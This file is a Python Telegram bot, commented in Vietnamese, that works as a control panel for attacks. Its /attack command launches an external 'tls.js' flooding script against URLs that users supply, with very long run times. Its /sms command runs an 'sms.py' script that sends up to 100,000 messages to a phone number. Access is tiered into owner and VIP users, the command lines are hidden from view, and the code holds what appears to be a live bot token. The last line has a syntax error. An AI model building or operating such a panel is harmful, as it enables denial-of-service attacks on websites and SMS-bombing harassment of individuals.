#!/usr/bin/env python3
import os
import shlex
import subprocess
import json
import threading
import asyncio
import time
import re
from urllib.parse import urlparse
from typing import Optional
from html import escape

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes


BOT_TOKEN ="8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A"
OWNER_ID = 7105201572
ADMINS_FILE = "admins.json"


ATTACK_EXECUTABLE = "node"     # Lệnh để chạy script attack
ATTACK_SCRIPT = "tls.js"       # Tên file script attack
SMS_EXECUTABLE = "python"      # Lệnh để chạy script SMS
SMS_SCRIPT = "sms.py"          # Tên file script SMS
# ------------------------------------

# (KHÔI PHỤC TỪ BẢN GỐC)
ALLOWED_FLAGS = {"--debug", "--http", "--full", "--cookie", "--query", "--winter"}
JOB_TIMEOUT_DEFAULT = 90000   # default timeout for attacks (s) = 15 minutes
MAX_OUTPUT_CHARS = 3000

# Web status (Flask)
WEB_HOST = "0.0.0.0"
WEB_PORT = 8080
WEB_TOKEN = "changeme_webtoken"  # CHANGE THIS!

# SMS settings (safety)
SMS_TIMEOUT = 120              # seconds per sms run
SMS_MAX_COUNT = 100000             # max count allowed via /sms
PHONE_REGEX = re.compile(r'^\+?\d{7,15}$')  # basic phone validation

# ===== Admin persistence =====
def load_admins():
    if os.path.exists(ADMINS_FILE):
        try:
            with open(ADMINS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            ids = set(int(x) for x in data if isinstance(x, (int, str)) and str(x).isdigit())
        except Exception:
            ids = set()
    else:
        ids = set()
    ids.add(OWNER_ID)
    return ids

def save_admins(admins_set):
    try:
        with open(ADMINS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(list(admins_set)), f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print("Save admins failed:", e)
        return False

ADMINS = load_admins()

# ===== Running process store =====
RUNNING_PROCS = {}
RUNNING_PROCS_LOCK = threading.Lock()
GLOBAL_LOOP = None
GLOBAL_APP = None

# ===== Utilities =====
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID

def is_admin(user_id: int) -> bool:
    return user_id in ADMINS

def is_safe_url(u: str) -> bool:
    try:
        p = urlparse(u)
        if p.scheme not in ("http", "https"):
            return False
        host = p.hostname or ""
        if host in ("localhost", "127.0.0.1", "0.0.0.0"):
            return False
        if host.startswith(("10.", "192.168.", "172.")):
            return False
        return True
    except Exception:
        return False

# (KHÔI PHỤC TỪ BẢN GỐC)
def parse_attack_args(args):
    """
    Phân tích cú pháp gốc: /attack <method> <url> [n1] [n2] [n3] [outfile] [flags]
    """
    if len(args) < 2:
        return None
    method = args[0].upper()
    if method not in ("GET", "POST", "PUT", "DELETE", "HEAD"):
        return None
    url = args[1]
    if not is_safe_url(url):
        return None

    idx = 2
    numbers = []
    while idx < len(args) and len(numbers) < 3 and args[idx].isdigit():
        numbers.append(args[idx]); idx += 1

    outfile = None
    if idx < len(args) and not args[idx].startswith("--"):
        outfile = args[idx]; idx += 1

    flags = []
    timeout = JOB_TIMEOUT_DEFAULT
    while idx < len(args):
        tok = args[idx]
        if tok in ALLOWED_FLAGS:
            flags.append(tok)
        elif tok.startswith("--timeout="):
            try:
                v = int(tok.split("=",1)[1])
                timeout = v
            except:
                pass
        idx += 1

    return {"method": method, "url": url, "numbers": numbers, "outfile": outfile, "flags": flags, "timeout": timeout}


# ===== Thread helpers =====
def _thread_send_message(chat_id: int, text: str, parse_mode=None):
    if GLOBAL_LOOP is None or GLOBAL_APP is None:
        return
    coro = GLOBAL_APP.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
    asyncio.run_coroutine_threadsafe(coro, GLOBAL_LOOP)

def _thread_send_document(chat_id: int, file_path: str):
    if GLOBAL_LOOP is None or GLOBAL_APP is None:
        return
    async def _send():
        try:
            await GLOBAL_APP.bot.send_document(chat_id=chat_id, document=open(file_path,"rb"))
        except Exception as e:
            await GLOBAL_APP.bot.send_message(chat_id=chat_id, text=f"⚠️ <b>Lỗi gửi file:</b> {escape(file_path)}: {e}", parse_mode=ParseMode.HTML)
    asyncio.run_coroutine_threadsafe(_send(), GLOBAL_LOOP)

def _proc_wait_thread(user_id: int, chat_id: int, proc: subprocess.Popen, cmd_list: list, outfile: Optional[str], timeout: Optional[int]):
    start = time.time()
    
    # Lấy thông tin target từ cmd_list để hiển thị (Ẩn tên script)
    # cmd_list là: [ATTACK_EXECUTABLE, ATTACK_SCRIPT, method, url, ...]
    target_url = "UNKNOWN"
    if len(cmd_list) > 3:
        target_url = cmd_list[3] # Index 3 là URL

    try:
        if timeout == 0:
            stdout, stderr = proc.communicate()
            returncode = proc.returncode
            timed_out = False
        else:
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
                returncode = proc.returncode
                timed_out = False
            except subprocess.TimeoutExpired:
                try:
                    proc.kill()
                except Exception:
                    pass
                try:
                    stdout, stderr = proc.communicate(timeout=5)
                except Exception:
                    stdout, stderr = ("", "")
                returncode = proc.returncode if proc.returncode is not None else -1
                timed_out = True
    except Exception as e:
        stdout, stderr = ("", f"Exception in thread: {e}")
        returncode = -1
        timed_out = False

    duration = int(time.time() - start)
    
    if timed_out:
        text = f"⏰ <b>[System]</b> Tác vụ đã HẾT HẠN (Timeout)!\n\n"
        text += f"<b>Target:</b> <code>{escape(target_url)}</code>\n"
        text += f"<b>Timeout:</b> {timeout}s"
    else:
        text = f"✅ <b>[System]</b> Tác vụ đã HOÀN TẤT\n\n"
        text += f"<b>Target:</b> <code>{escape(target_url)}</code>\n"
        text += f"<b>Status:</b> Exit Code {returncode}\n"
        text += f"<b>Duration:</b> {duration}s"

    if stdout:
        txt = stdout if isinstance(stdout, str) else str(stdout)
        text += "\n\n<b>Output:</b>\n<pre>" + escape(txt[:MAX_OUTPUT_CHARS]) + "</pre>"
    if stderr:
        ter = stderr if isinstance(stderr, str) else str(stderr)
        text += "\n\n<b>Error:</b>\n<pre>" + escape(ter[:MAX_OUTPUT_CHARS]) + "</pre>"
        
    if len(text) > 4000:
        text = text[:3900] + "\n...[truncated]"

    _thread_send_message(chat_id, text, parse_mode=ParseMode.HTML)

    if outfile:
        if os.path.exists(outfile) and os.path.isfile(outfile):
            _thread_send_document(chat_id, outfile)
        else:
            _thread_send_message(chat_id, f"ℹ️ <i>Không tìm thấy file outfile: {escape(outfile)}</i>", parse_mode=ParseMode.HTML)

    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(user_id)
        if entry and entry.get("proc") is proc:
            RUNNING_PROCS.pop(user_id, None)

# ===== Handlers =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "╔══════════════════════╗\n"
        "      <b>Anonymous Bot System</b>\n"
        "╚══════════════════════╝\n\n"
        "<i>Bot đã sẵn sàng. Hệ thống trực tuyến.</i>\n\n"
        "► Gõ /help để xem danh sách lệnh.\n"
        "► Owner: /addvip | /delvip | /viplist\n"
        "► Admin: /attack | /sms | /kill",
        parse_mode=ParseMode.HTML
    )

# VIP management
async def addvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Owner mới có quyền thêm VIP.", parse_mode=ParseMode.HTML)
        return
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_id = update.message.reply_to_message.from_user.id
    else:
        args = context.args
        if not args:
            await update.message.reply_text("<i>Cú pháp: /addvip &lt;user_id&gt; (hoặc reply).</i>", parse_mode=ParseMode.HTML)
            return
        try:
            target_id = int(args[0])
        except:
            await update.message.reply_text("ID không hợp lệ.")
            return
    if target_id in ADMINS:
        await update.message.reply_text(f"ℹ️ User <code>{target_id}</code> đã là VIP.", parse_mode=ParseMode.HTML)
        return
    ADMINS.add(target_id)
    ok = save_admins(ADMINS)
    msg = f"✅ <b>Đã thêm VIP:</b> <code>{target_id}</code>"
    if not ok:
        msg += "\n⚠️ <i>Lỗi: Không thể lưu vào tệp.</i>"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def delvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Owner mới có quyền xóa VIP.", parse_mode=ParseMode.HTML)
        return
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_id = update.message.reply_to_message.from_user.id
    else:
        args = context.args
        if not args:
            await update.message.reply_text("<i>Cú pháp: /delvip &lt;user_id&gt; (hoặc reply).</i>", parse_mode=ParseMode.HTML)
            return
        try:
            target_id = int(args[0])
        except:
            await update.message.reply_text("ID không hợp lệ.")
            return
    if target_id == OWNER_ID:
        await update.message.reply_text("❌ Không thể xóa Owner.", parse_mode=ParseMode.HTML)
        return
    if target_id not in ADMINS:
        await update.message.reply_text("User không phải VIP.")
        return
    ADMINS.discard(target_id)
    ok = save_admins(ADMINS)
    msg = f"✅ <b>Đã xóa VIP:</b> <code>{target_id}</code>"
    if not ok:
        msg += "\n⚠️ <i>Lỗi: Không thể lưu vào tệp.</i>"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)


async def viplist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_admin(caller) and not is_owner(caller):
        await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Admin/Owner mới xem được.", parse_mode=ParseMode.HTML)
        return
    if not ADMINS:
        await update.message.reply_text("<i>Danh sách VIP rỗng.</i>", parse_mode=ParseMode.HTML)
        return
    
    text = "👑 <b>Danh sách VIP (Admin)</b> 👑\n\n"
    text += "\n".join(f"► <code>{x}</code> {'(<b>Owner</b>)' if x == OWNER_ID else ''}" for x in sorted(ADMINS))
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

# Attack
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id) and not is_owner(user_id):
        await update.message.reply_text("❌ <b>Access Denied:</b> Bạn không có quyền.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            "<i>Cú pháp: /attack &lt;method&gt; &lt;url&gt; &lt;n1&gt; &lt;n2&gt; &lt;n3&gt; &lt;outfile&gt; [--flags] [--timeout=s]</i>",
            parse_mode=ParseMode.HTML
        )
        return
        
    # (SỬA ĐỔI) Sử dụng parser gốc
    parsed = parse_attack_args(args)
    if not parsed:
        await update.message.reply_text(f"❌ <b>Lỗi cú pháp:</b>\nCú pháp không hợp lệ hoặc URL nằm trong danh sách cấm.", parse_mode=ParseMode.HTML)
        return

    # (SỬA ĐỔI) Xây dựng lệnh (Ẩn tên file)
    cmd = [ATTACK_EXECUTABLE, ATTACK_SCRIPT, parsed["method"], parsed["url"]] + parsed["numbers"]
    if parsed["outfile"]:
        cmd.append(parsed["outfile"])
    cmd += parsed["flags"]
    
    timeout = parsed.get("timeout", JOB_TIMEOUT_DEFAULT)
    
    # (SỬA ĐỔI) Gửi tin nhắn xác nhận (Ẩn lệnh)
    reply_text = (
        f"🚀 <b>[System]</b> Đã nhận lệnh!\n"
        f"══════════════════\n"
        f"<b>Target:</b> <code>{escape(parsed['url'])}</code>\n"
        f"<b>Method:</b> <code>{parsed['method']}</code>\n"
        f"<b>Params:</b> <code>{' '.join(parsed['numbers']) if parsed['numbers'] else 'N/A'}</code>\n"
        f"<b>Outfile:</b> <code>{escape(parsed['outfile']) if parsed['outfile'] else 'N/A'}</code>\n"
        f"<b>Flags:</b> <code>{' '.join(parsed['flags']) if parsed['flags'] else 'N/A'}</code>\n"
        f"<b>Timeout:</b> <code>{timeout}s</code>\n"
        f"══════════════════\n"
        f"<i>...Đang khởi tạo tác vụ...</i>"
    )
    await update.message.reply_text(reply_text, parse_mode=ParseMode.HTML)

    with RUNNING_PROCS_LOCK:
        if user_id in RUNNING_PROCS:
            await update.message.reply_text("⚠️ <b>Cảnh báo:</b> Bạn đã có tác vụ đang chạy. Dùng /kill trước khi bắt đầu tác vụ mới.", parse_mode=ParseMode.HTML)
            return
            
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='ignore')
    except FileNotFoundError as e:
        await update.message.reply_text(f"❌ <b>Lỗi hệ thống:</b> Không tìm thấy script thực thi.\n<i>{escape(str(e))}</i>", parse_mode=ParseMode.HTML)
        return
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Lỗi hệ thống:</b> Không thể khởi tạo tiến trình.\n<i>{escape(str(e))}</i>", parse_mode=ParseMode.HTML)
        return
        
    thread = threading.Thread(target=_proc_wait_thread, args=(user_id, chat_id, proc, cmd, parsed.get("outfile"), timeout), daemon=True)
    thread.start()
    
    with RUNNING_PROCS_LOCK:
        RUNNING_PROCS[user_id] = {"proc": proc, "thread": thread, "cmd": cmd, "start_ts": time.time(), "timeout": timeout, "outfile": parsed.get("outfile")}
        
    await update.message.reply_text("✅ <b>[System]</b> Tác vụ đã bắt đầu.", parse_mode=ParseMode.HTML)

# Kill
async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    args = context.args
    if len(args) == 0:
        target = caller
        if not is_admin(caller) and not is_owner(caller):
            await update.message.reply_text("❌ <b>Access Denied:</b> Bạn không có quyền.", parse_mode=ParseMode.HTML)
            return
    else:
        if args[0].lower() == "all":
            if not is_owner(caller):
                await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Owner mới /kill all.", parse_mode=ParseMode.HTML)
                return
            killed = []
            with RUNNING_PROCS_LOCK:
                keys = list(RUNNING_PROCS.keys())
            for uid in keys:
                with RUNNING_PROCS_LOCK:
                    entry = RUNNING_PROCS.get(uid)
                if entry:
                    try:
                        entry["proc"].kill()
                        killed.append(uid)
                    except:
                        pass
            await update.message.reply_text(f"✅ <b>[System]</b> Đã gửi tín hiệu Kill All tới <b>{len(killed)}</b> tác vụ.", parse_mode=ParseMode.HTML)
            return
        else:
            try:
                target = int(args[0])
            except:
                await update.message.reply_text("<i>Cú pháp: /kill, /kill all, hoặc /kill &lt;user_id&gt;</i>", parse_mode=ParseMode.HTML)
                return
            if not is_owner(caller):
                await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Owner mới /kill người khác.", parse_mode=ParseMode.HTML)
                return
                
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(target)
        
    if not entry:
        await update.message.reply_text("❗ <b>[System]</b> Không tìm thấy tác vụ đang chạy cho user đó.", parse_mode=ParseMode.HTML)
        return
        
    try:
        entry["proc"].kill()
        await update.message.reply_text(f"🛑 <b>[System]</b> Đã gửi tín hiệu Kill tới tác vụ của user <code>{target}</code>.", parse_mode=ParseMode.HTML)
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Lỗi:</b> Không thể kill: {escape(str(e))}", parse_mode=ParseMode.HTML)

# Status (list)
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with RUNNING_PROCS_LOCK:
        if not RUNNING_PROCS:
            await update.message.reply_text("<i>Hiện không có tác vụ nào đang chạy.</i>", parse_mode=ParseMode.HTML)
            return
        lines = []
        now = time.time()
        
        for uid, entry in RUNNING_PROCS.items():
            elapsed = int(now - entry.get("start_ts", now))
            pid = getattr(entry.get("proc"), "pid", None)
            timeout = entry.get("timeout")
            
            # Ẩn lệnh, chỉ hiển thị target
            cmd = entry.get("cmd") or []
            target_url = cmd[3] if len(cmd) > 3 else "N/A"
            
            lines.append(
                f"👤 <b>User:</b> <code>{uid}</code>\n"
                f"  <b>PID:</b> <code>{pid}</code>\n"
                f"  <b>Elapsed:</b> {elapsed}s (Timeout: {timeout}s)\n"
                f"  <b>Target:</b> <code>{escape(target_url)}</code>"
            )
            
        txt = f"📊 <b>Tác vụ đang chạy ({len(RUNNING_PROCS)})</b>\n\n" + "\n\n".join(lines)
        
        if len(txt) > 4000:
            txt = txt[:3900] + "\n...[truncated]"
            
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

# Checkstatus (caller)
async def checkstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(caller)
    if not entry:
        await update.message.reply_text("<i>Bạn không có tác vụ nào đang chạy.</i>", parse_mode=ParseMode.HTML)
        return
        
    proc = entry.get("proc")
    pid = getattr(proc, "pid", None)
    start_ts = entry.get("start_ts")
    elapsed = int(time.time() - start_ts) if start_ts else 0
    timeout = entry.get("timeout")
    cmd = entry.get("cmd", [])
    outfile = entry.get("outfile")
    is_running = proc.poll() is None
    
    # Ẩn lệnh, chỉ hiển thị target
    target_url = cmd[3] if len(cmd) > 3 else "N/A"

    txt = (
        f"<b>Chi tiết tác vụ của bạn:</b>\n\n"
        f"<b>PID:</b> <code>{pid}</code>\n"
        f"<b>Running:</b> {is_running}\n"
        f"<b>Elapsed:</b> {elapsed}s\n"
        f"<b>Timeout:</b> {timeout}s\n"
        f"<b>Target:</b> <code>{escape(target_url)}</code>\n"
        f"<b>Outfile:</b> {escape(str(outfile)) if outfile else 'N/A'}"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

# Proc info (owner)
async def proc_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text("<i>Cú pháp: /proc &lt;user_id&gt;</i>", parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(args[0])
    except:
        await update.message.reply_text("ID không hợp lệ.")
        return
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(uid)
    if not entry:
        await update.message.reply_text("Không có tác vụ đang chạy cho user này.", parse_mode=ParseMode.HTML)
        return
        
    proc = entry.get("proc")
    pid = getattr(proc, "pid", None)
    start_ts = entry.get("start_ts")
    elapsed = int(time.time() - start_ts) if start_ts else 0
    timeout = entry.get("timeout")
    cmd = entry.get("cmd", [])
    outfile = entry.get("outfile")
    is_running = proc.poll() is None
    
    # Ẩn lệnh, chỉ hiển thị target
    target_url = cmd[3] if len(cmd) > 3 else "N/A"

    txt = (
        f"<b>Chi tiết tác vụ (User: {uid}):</b>\n\n"
        f"<b>PID:</b> <code>{pid}</code>\n"
        f"<b>Running:</b> {is_running}\n"
        f"<b>Elapsed:</b> {elapsed}s\n"
        f"<b>Timeout:</b> {timeout}s\n"
        f"<b>Target:</b> <code>{escape(target_url)}</code>\n"
        f"<b>Outfile:</b> {escape(str(outfile)) if outfile else 'N/A'}"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML)


# PID info (owner)
async def pid_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ <b>Access Denied:</b> Chỉ Owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text("<i>Cú pháp: /pid &lt;user_id&gt;</i>", parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(args[0])
    except:
        await update.message.reply_text("ID không hợp lệ.")
        return
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(uid)
    if not entry:
        await update.message.reply_text("Không có tác vụ đang chạy cho user này.", parse_mode=ParseMode.HTML)
        return
    pid = getattr(entry.get("proc"), "pid", None)
    await update.message.reply_text(f"User <code>{uid}</code> ➜ PID: <code>{pid}</code>", parse_mode=ParseMode.HTML)

# HELP
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>Command Menu</b>\n"
        "══════════════════\n\n"
        
        "<b>General Commands:</b>\n"
        "<b>/attack</b> <code>&lt;method&gt; &lt;url&gt; &lt;n1&gt;... &lt;outfile&gt; [--flags]...</code>\n"
        "  <i>(Khởi tạo tác vụ mới)</i>\n\n"
        
        "<b>/sms</b> <code>&lt;phone&gt; &lt;count&gt;</code>\n"
        "  <i>(Admin only - Gửi tác vụ SMS)</i>\n\n"
        
        "<b>/kill</b> <code>[all | user_id]</code>\n"
        "  <i>(Dừng tác vụ. Mặc định là của bạn)</i>\n\n"
        
        "<b>/status</b>\n"
        "  <i>(Xem tất cả tác vụ đang chạy)</i>\n\n"
        
        "<b>/checkstatus</b>\n"
        "  <i>(Xem chi tiết tác vụ của bạn)</i>\n\n"
        
        "<b>Owner Commands:</b>\n"
        "<b>/addvip</b> <code>&lt;user_id&gt;</code>\n"
        "<b>/delvip</b> <code>&lt;user_id&gt;</code>\n"
        "<b>/viplist</b>\n"
        "<b>/proc</b> <code>&lt;user_id&gt;</code>\n"
        "<b>/pid</b> <code>&lt;user_id&gt;</code>\n",
        parse_mode=ParseMode.HTML
    )

# ===== SMS handler =====
async def sms_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_admin(caller) and not is_owner(caller):
        await update.message.reply_text("❌ <b>Access Denied:</b> Bạn không có quyền dùng /sms.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("<i>Cú pháp: /sms &lt;phone&gt; &lt;count&gt;</i>", parse_mode=ParseMode.HTML)
        return
    phone = args[0].strip()
    count_s = args[1].strip()
    
    # validate phone
    if not PHONE_REGEX.match(phone):
        await update.message.reply_text("Số điện thoại không hợp lệ. (VD: <code>+84901234567</code>)", parse_mode=ParseMode.HTML)
        return
    try:
        count = int(count_s)
    except:
        await update.message.reply_text("Count phải là số nguyên.")
        return
    if count < 1:
        await update.message.reply_text("Count phải >= 1.")
        return
    if count > SMS_MAX_COUNT:
        await update.message.reply_text(f"Count quá lớn. Tối đa = {SMS_MAX_COUNT}.")
        return

    # ensure script exists
    if not os.path.exists(SMS_SCRIPT):
        await update.message.reply_text(f"❌ <b>Lỗi hệ thống:</b> Không tìm thấy script thực thi.", parse_mode=ParseMode.HTML)
        return

    cmd = [SMS_EXECUTABLE, SMS_SCRIPT, phone, str(count)]
    
    # Ẩn lệnh
    await update.message.reply_text(
        f"📨 <b>[System]</b> Đang chạy tác vụ SMS...\n"
        f"<b>Target:</b> <code>{escape(phone)}</code>\n"
        f"<b>Count:</b> <code>{count}</code>",
        parse_mode=ParseMode.HTML
    )

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=SMS_TIMEOUT, encoding='utf-8', errors='ignore')
        stdout = proc.stdout.strip()
        stderr = proc.stderr.strip()
        
        # Ẩn tên file (thay "dec.py" hoặc "sms.py")
        reply = f"✅ <b>[System]</b> Tác vụ SMS hoàn tất (Code: {proc.returncode})\n"
        
        if stdout:
            reply += "\n<b>Output:</b>\n<pre>" + escape(stdout[:2000]) + "</pre>"
        if stderr:
            reply += "\n<b>Error:</b>\n<pre>" + escape(stderr[:1000]) + "</pre>"
            
        if len(reply) > 4000:
            reply = reply[:3900] + "\n...[truncated]"
        await update.message.reply_text(reply, parse_mode=ParseMode.HTML)
        
    except subprocess.TimeoutExpired:
        await update.message.reply_text(f"⏰ <b>[System]</b> Tác vụ SMS timeout sau {SMS_TIMEOUT}s — đã dừng.", parse_mode=ParseMode.HTML)
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Lỗi hệ thống:</b> Không thể chạy tác vụ SMS.\n<i>{escape(str(e))}</i>", parse_mode=ParseMode.HTML)


# ===== Simple Flask web status =====
# (Giữ nguyên, không thay đổi)
def start_web_server(host=WEB_HOST, port=WEB_PORT):
    try:
        from flask import Flask, jsonify, request, render_template_string
    except Exception:
        print("Flask not installed. Run: pip install Flask")
        return

    app = Flask("bot_status")
    HTML_TEMPLATE = """
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Bot status</title></head>
      <body>
        <h2>Running processes ({{count}})</h2>
        <table border="1" cellpadding="6" cellspacing="0">
          <tr><th>user</th><th>pid</th><th>elapsed(s)</th><th>timeout(s)</th><th>cmd (hidden)</th><th>target</th><th>outfile</th></tr>
          {% for r in rows %}
          <tr>
            <td>{{r.user}}</td>
            <td>{{r.pid}}</td>
            <td>{{r.elapsed}}</td>
            <td>{{r.timeout}}</td>
            <td><code>[command hidden]</code></td>
            <td><code>{{r.target}}</code></td>
            <td>{{r.outfile}}</td>
          </tr>
          {% endfor %}
        </table>
        <p>Kill via web (owner): GET /kill?token=TOKEN&uid=USER_ID</p>
      </body>
    </html>
    """

    @app.route("/")
    def index():
        rows = []
        now = time.time()
        with RUNNING_PROCS_LOCK:
            for uid, entry in RUNNING_PROCS.items():
                proc = entry.get("proc")
                pid = getattr(proc, "pid", None)
                start_ts = entry.get("start_ts", now)
                elapsed = int(now - start_ts)
                timeout = entry.get("timeout")
                
                # Ẩn lệnh, chỉ hiển thị target
                cmd = entry.get("cmd") or []
                target_url = cmd[3] if len(cmd) > 3 else "N/A"
                
                outfile = entry.get("outfile")
                rows.append({"user": uid, "pid": pid, "elapsed": elapsed, "timeout": timeout, "target": target_url, "outfile": outfile})
        return render_template_string(HTML_TEMPLATE, rows=rows, count=len(rows))

    @app.route("/json")
    def json_status():
        out = {}
        now = time.time()
        with RUNNING_PROCS_LOCK:
            for uid, entry in RUNNING_PROCS.items():
                proc = entry.get("proc")
                pid = getattr(proc, "pid", None)
                start_ts = entry.get("start_ts", now)
                elapsed = int(now - start_ts)
                timeout = entry.get("timeout")
                
                # Ẩn lệnh, chỉ hiển thị target
                cmd = entry.get("cmd") or []
                target_url = cmd[3] if len(cmd) > 3 else "N/A"
                
                outfile = entry.get("outfile")
                running = proc.poll() is None
                out[str(uid)] = {"pid": pid, "elapsed": elapsed, "timeout": timeout, "target": target_url, "outfile": outfile, "running": running}
        return jsonify(out)

    def _do_kill_uid(uid):
        with RUNNING_PROCS_LOCK:
            entry = RUNNING_PROCS.get(uid)
        if not entry:
            return False, "no such running proc"
        try:
            entry["proc"].kill()
            return True, "kill sent"
        except Exception as e:
            return False, str(e)

    @app.route("/kill", methods=["GET","POST"])
    def web_kill():
        token = request.values.get("token")
        if token != WEB_TOKEN:
            return ("forbidden", 403)
        uid = request.values.get("uid")
        if not uid:
            return ("missing uid", 400)
        try:
            uid_i = int(uid)
        except:
            return ("invalid uid", 400)
        ok, msg = _do_kill_uid(uid_i)
        status_code = 200 if ok else 400
        return (json.dumps({"ok": ok, "msg": msg}), status_code)

    def _run():
        print(f"Starting web status server on http://{host}:{port}  (token required for /kill)")
        app.run(host=host, port=port, threaded=True)

    t = threading.Thread(target=_run, daemon=True)
    t.start()


# ===== Main =====
def main():
    global GLOBAL_LOOP, GLOBAL_APP
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    GLOBAL_APP = app
    GLOBAL_LOOP = asyncio.get_event_loop()

    # Thêm các handler
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))

    # Lệnh tác vụ
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("sms", sms_cmd))
    app.add_handler(CommandHandler("kill", kill))
    
    # Lệnh trạng thái
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("checkstatus", checkstatus))
    
    # Lệnh quản lý (Owner)
    app.add_handler(CommandHandler("proc", proc_info))
    app.add_handler(CommandHandler("pid", pid_info))
    app.add_handler(CommandHandler("addvip", addvip))
    app.add_handler(CommandHandler("delvip", delvip))
    app.add_handler(CommandHandler("viplist", viplist))


    # start web server
    start_web_server(host=WEB_HOST, port=WEB_PORT)

    print("✅ Bot running. Owner ID:", OWNER_ID, f"(Admins: {len(ADMINS)})")
    app.run_polling()

if __name__ == "__main__":
    main())